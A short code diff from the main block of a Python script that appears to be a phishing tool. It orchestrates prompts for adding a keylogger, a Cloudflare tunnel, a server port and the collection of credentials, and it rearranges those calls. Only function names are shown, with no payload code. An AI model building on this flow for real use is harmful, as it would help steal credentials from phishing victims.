@@ -34,9 +34,8 @@ readConfig()
 
 if __name__ == "__main__":
     try:
-        runMainMenu()
-        mainMenu()
 
+        mainMenu()
         keyloggerprompt()
         addingkeylogger()
         cloudfarePrompt()
@@ -45,13 +44,14 @@ if __name__ == "__main__":
         port = selectPort()
 
         ##############
-        runServer(port)
         selectServer(port)
-
-        multiprocessing.Process(target=runServer, args=(port,)).start()
-        getCredentials(port)
+        input()
+        exit()
 
     except KeyboardInterrupt:
+
         port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        getCredentials1(port)
         endMessage(port)
+        input()
         exit()
